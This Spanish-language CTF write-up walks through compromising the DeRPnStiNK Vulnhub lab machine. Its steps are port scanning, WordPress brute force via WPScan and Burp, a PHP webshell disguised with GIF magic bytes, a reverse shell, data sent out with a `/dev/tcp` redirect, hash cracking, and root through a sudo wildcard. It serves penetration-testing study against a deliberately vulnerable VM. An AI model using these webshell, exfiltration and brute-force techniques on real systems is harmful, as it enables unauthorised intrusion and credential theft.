---
title: DeRPnStiNK Writeup - Vulnhub
date: 2025-02-13
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, DeRPnStiNK, OSCP Prep, Wordpress]
image:
  path: /assets/img/commons/vulnhub/DeRPnStiNK/portada.png
---

Anterior [*OSCP Lab 6*](https://lvs3c.github.io/posts/OSCP-w1r3s/)

¡Saludos!

**`OSCP Lab 7`**

En este writeup, realizaremos la máquina [**DeRPnStiNK**](https://www.vulnhub.com/entry/derpnstink-1,221/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Vulnerar CMS Wordpress**.
  - Mediante WPScan.
  - Mediante BurpSuite.
- **Upload File** para obtener reverse shell.
- **User Pivoting** para poder elevar nuestros privilegios.
- Y por último, crear y ejecutar un archivo para convertirnos en root y obtener las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.19     00:0c:29:3a:b3:df       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.694 seconds (95.03 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.19
PING 10.11.12.19 (10.11.12.19) 56(84) bytes of data.
64 bytes from 10.11.12.19: icmp_seq=1 ttl=64 time=0.763 ms

--- 10.11.12.19 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.763/0.763/0.763/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.19 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 20:47 -03
Nmap scan report for 10.11.12.19
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:3A:B3:DF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p21,22,80 -sCV 10.11.12.19 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 20:48 -03
Nmap scan report for 10.11.12.19
Host is up (0.00064s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `vsftpd 3.0.2`.
- Puerto `22` servidor `OpenSSH 6.6.1p1`.
- Puerto `80` servidor `Apache httpd 2.4.7`.

### FTP - 21

Nos pide usuario y clave, usuario anonymous no tiene permiso de acceso. Dejamos para más adelante este puerto.

```bash
❯ ftp 10.11.12.19
Connected to 10.11.12.19.
220 (vsFTPd 3.0.2)
Name (10.11.12.19:lvs3c): anonymous
530 Permission denied.
ftp: Login failed
```

### SSH - 22

Nos da permiso denegado y nos pide un certificado de clave pública.

```bash
❯ ssh lvs3c@10.11.12.19
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

lvs3c@10.11.12.19: Permission denied (publickey).
```

### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.19/
http://10.11.12.19/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], Google-API[ajax/libs/jquery/1.7.1/jquery.min.js], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.11.12.19], JQuery[1.7.1], Script[text/info,text/javascript], Title[DeRPnStiNK]
```

![web](/assets/img/commons/vulnhub/DeRPnStiNK/web.png){: .center-image }

Encontramos la primer flag.

![flag1](/assets/img/commons/vulnhub/DeRPnStiNK/flag1.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.19 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 20:51 -03
Nmap scan report for 10.11.12.19
Host is up (0.00075s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /robots.txt: Robots file
|_  /weblog/wp-login.php: Wordpress login page.

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

Corremos `gobuster` para obtener más resutados.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://derpnstink.local/ -e -x php,txt,html,bak,bkp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://derpnstink.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,bkp,php,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://derpnstink.local/weblog               (Status: 301) [Size: 320] [--> http://derpnstink.local/weblog/]
http://derpnstink.local/php                  (Status: 301) [Size: 317] [--> http://derpnstink.local/php/]
http://derpnstink.local/css                  (Status: 301) [Size: 317] [--> http://derpnstink.local/css/]
http://derpnstink.local/js                   (Status: 301) [Size: 316] [--> http://derpnstink.local/js/]
http://derpnstink.local/javascript           (Status: 301) [Size: 324] [--> http://derpnstink.local/javascript/]
http://derpnstink.local/temporary            (Status: 301) [Size: 323] [--> http://derpnstink.local/temporary/]
```

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://derpnstink.local/php/ -e -x php,txt,html,bak,bkp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://derpnstink.local/php/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak,bkp
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://derpnstink.local/php/info.php             (Status: 200) [Size: 0]
http://derpnstink.local/php/phpmyadmin           (Status: 301) [Size: 328] [--> http://derpnstink.local/php/phpmyadmin/]
```

Encontramos el panel de administración `phpmyadmin`.

Validamos la url `/weblog/wp-login.php` y vemos que la web busca recursos mediante el DNS `derpnstink.local`.

![dns](/assets/img/commons/vulnhub/DeRPnStiNK/dns.png){: .center-image }

Añadimos la entrada a nuestro archivo `/etc/hosts`.

```bash
❯ echo "10.11.12.19\tderpnstink.local" >> /etc/hosts
```

Ingresamos al blog, confirmamos `Wordpress`{: .filepth}.

![weblog](/assets/img/commons/vulnhub/DeRPnStiNK/weblog.png){: .center-image }

Usamos la herramienta `wpscan` para testear el sitio.

```bash
❯ wpscan --url http://derpnstink.local/weblog/ -e u,vp,vt --api-token=$TOKEN

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'
 |
 | [!] 66 vulnerabilities identified:
 
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

La versión de WordPress está obsoleta, expuesta a gran cantidad de vulnerabilidades. Procedemos a realizar fuerza bruta sobre el usuario `admin`.

```bash
❯ wpscan --url http://derpnstink.local/weblog/ -U admin -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / admin
Trying admin / akusayangkamu Time: 00:06:57 <                                                        > (19820 / 14364212)  0.13%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: admin
```

Ya tenemos la contraseña de acceso. 

>Vamos a ver otra forma en la que podemos realizar fuerza bruta.
Explotaremos el archivo `xmlrpc.php` que por el informe de wpscan está expuesto, lo realizaremos utilizando `intruder` de `BurpSuite`{: .filepath} en modo `sniper`.
{: .prompt-tip }

El archivo xmlrpc recibe solitudes por POST, capturamos la solicitud con BurpSuite.

![xmlrpc](/assets/img/commons/vulnhub/DeRPnStiNK/xmlrpc.png){: .normal }

![xml1](/assets/img/commons/vulnhub/DeRPnStiNK/xml1.png){: .normal }

`XML para obtener lista de métodos disponibles`

```bash
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

![xml2](/assets/img/commons/vulnhub/DeRPnStiNK/xml2.png){: .normal }

`XML para validar user:pass sobre el método wp.getUsersBlogs`

```bash
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

![xml3](/assets/img/commons/vulnhub/DeRPnStiNK/xml3.png){: .normal }

Pasamos la solicitud al `intruder`{: .filepath} en modo `sniper`{: .filepath} y lanzamos el ataque.

![xml4](/assets/img/commons/vulnhub/DeRPnStiNK/xml4.png){: .normal }

Observamos la longitud de las respuestas y hay una que pesa más.

![xml5](/assets/img/commons/vulnhub/DeRPnStiNK/xml5.png){: .normal }

Tenemos la contraseña de acceso.

Ingresamos.

![wp_access](/assets/img/commons/vulnhub/DeRPnStiNK/wp_access.png){: .normal }


## Explotación

---

El usuario `admin`{: .filepath} no es administrador del sitio, pero trataremos de obtener información partiendo desde este usuario.

Dentro del panel de administración, vemos el menú `slideshow`, aquí creamos un nuevo slide subiendo nuestro archivo `cmd.php`{: .filepath} para obtener `rce`{: .filepath}.

Código

```bash
GIF8;
<?php system($_GET['c']); ?>
```

`GIF8`{: .filepath}, para los magic numbers de `GIF`{: .filepath}, por si existen validaciones de extensiones.

Abrimos nuestra nueva slide y tenemos ejecución de código.

![rce](/assets/img/commons/vulnhub/DeRPnStiNK/rce.png){: .normal }

Nos ponemos en escucha y lanzamos una reverse shell.

![rs](/assets/img/commons/vulnhub/DeRPnStiNK/rs.png){: .normal }

```bash
❯ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.19] 41108
bash: cannot set terminal process group (1261): Inappropriate ioctl for device
bash: no job control in this shell
</html/weblog/wp-content/uploads/slideshow-gallery$ whoami
whoami
www-data
</html/weblog/wp-content/uploads/slideshow-gallery$
```

Validamos la configuración de wp-config para obtener acceso a la base de datos.

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Validamos los usuarios del sistema.

```bash
</html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
```

Ingresamos al panel de `phpmyadmin` con las credenciales y buscamos información de usuarios.

![uncle](/assets/img/commons/vulnhub/DeRPnStiNK/uncle.png){: .normal }

Pasamos el hash por `john` del usario `unclestinky`{: .filepath}.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wedgie57         (?)
1g 0:00:00:35 DONE (2025-02-16 14:37) 0.02786g/s 77912p/s 77912c/s 77912C/s wee1994....wedders1234
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Iniciamos sesión en Wordpress y ahora somos admin.

Validamos los post y encontramos la flag 2.

![flag2](/assets/img/commons/vulnhub/DeRPnStiNK/flag2.png){: .normal }

En este punto si volvemos a lanzar la reverse shell lo seguiríamos haciendo con el usuario `www-data`{: .filepath}. 

Vamos a probar conectarnos por FTP con la clave obtenida sobre los usuarios `stinky` y `mrderp`.

```bash
❯ ftp 10.11.12.19
Connected to 10.11.12.19.
220 (vsFTPd 3.0.2)
Name (10.11.12.19:lvs3c): stinky
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45376|).
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||48267|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
226 Directory send OK.
```

En el directorio `network-logs` tenemos el archivo `derpissues.txt`.

![derpissues](/assets/img/commons/vulnhub/DeRPnStiNK/derpissues.png){: .normal }

El el directorio `SSH` hay varios directorios más con nombre `ssh`{: .filepath} y al final encontramos la **publickey**.

![key](/assets/img/commons/vulnhub/DeRPnStiNK/key.png){: .normal }

Nos conectamos por `SSH`{: .filepath}.

`PD`{: .filepath}: Si reciben el mensaje `sign_and_send_pubkey: no mutual signature supported. Permission denied (publickey)`, hay que hacer la conexión de esta forma.

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i stinky_rsa stinky@10.11.12.19
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

331 packages can be updated.
231 updates are security updates.

Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
stinky@DeRPnStiNK:~$
```

Listamos la flag 3.

```bash
stinky@DeRPnStiNK:~/Desktop$ cat flag.txt
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```

## User Pivoting

En la carpeta `Documents`{: .filepath} encontramos un archivo .pcap, lo enviamos a nuestra máquina mediante tcp y analizamos su contenido.

```bash
stinky@DeRPnStiNK:~/Documents$ ls
derpissues.pcap
stinky@DeRPnStiNK:~/Documents$ cat derpissues.pcap > /dev/tcp/10.11.12.10/443
```

Viendo el contenido con `strings`, damos con la clave de `mrderp`{: .filepath}.

```bash
❯ sudo nc -nlvp 443 > derpissues.pcap
❯ strings derpissues.pcap | grep mrderp
action=createuser&_wpnonce_create-user=b250402af6&_wp_http_referer=%2Fweblog%2Fwp-admin%2Fuser-new.php&user_login=mrderp&email=mrderp%40derpnstink.local&first_name=mr&last_name=derp&url=%2Fhome%2Fmrderp&pass1=derpderpderpderpderpderpderp&pass1-text=derpderpderpderpderpderpderp&pass2=derpderpderpderpderpderpderp&pw_weak=on&role=administrator&createuser=Add+New+User
❯ pass1=derpderpderpderpderpderpderp
```

Cambiamos al usuario `mrderp`.


## Escalación de privilegios

---

Listamos los permisos sobre el sistema y tenemos permiso total sobre los archivos *derpy* dentro de *binaries*.

```bash
mrderp@DeRPnStiNK:~$ sudo -l
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

El directorio y archivos en `/binaries/derpy*` no existen, con lo cual debemos crearlos.

Creamos un archivo bash que solamente al ejecutar el comando, nos devuelva la shell con usuario root.

Listamos la flag 4.

```bash
mrderp@DeRPnStiNK:~/binaries$ cat derpy.sh
/bin/bash
mrderp@DeRPnStiNK:~/binaries$ sudo /home/mrderp/binaries/derpy.sh
root@DeRPnStiNK:~/binaries# cd /root
root@DeRPnStiNK:/root# ls -la
total 92
drwx------ 14 root root 4096 Jan  9  2018 .
drwxr-xr-x 23 root root 4096 Nov 12  2017 ..
-rw-------  1 root root 2338 Jan  9  2018 .ICEauthority
-rw-------  1 root root   55 Jan  9  2018 .Xauthority
-rw-------  1 root root 1391 Jan  9  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------ 10 root root 4096 Nov 12  2017 .cache
drwx------  3 root root 4096 Nov 13  2017 .compiz
drwxr-xr-x 15 root root 4096 Nov 12  2017 .config
drwx------  3 root root 4096 Nov 12  2017 .dbus
-rw-r--r--  1 root root   25 Nov 12  2017 .dmrc
drwx------  3 root root 4096 Jan  9  2018 .gconf
drwx------  2 root root 4096 Nov 12  2017 .gvfs
drwxr-xr-x  3 root root 4096 Nov 12  2017 .local
drwx------  4 root root 4096 Nov 12  2017 .mozilla
-rw-------  1 root root  181 Nov 11  2017 .mysql_history
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
drwx------  2 root root 4096 Nov 11  2017 .ssh
-rw-------  1 root root 1431 Jan  9  2018 .xsession-errors
-rw-------  1 root root 1431 Jan  9  2018 .xsession-errors.old
drwxr-xr-x  2 root root 4096 Nov 13  2017 Desktop
drwxr-xr-x  2 root root 4096 Nov 12  2017 Documents
drwxr-xr-x  2 root root 4096 Nov 12  2017 Downloads
root@DeRPnStiNK:/root# find . -name flag*
./Desktop/flag.txt
root@DeRPnStiNK:/root# cd Desktop/
root@DeRPnStiNK:/root/Desktop# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo


root@DeRPnStiNK:/root/Desktop#
```

Hope it helps!
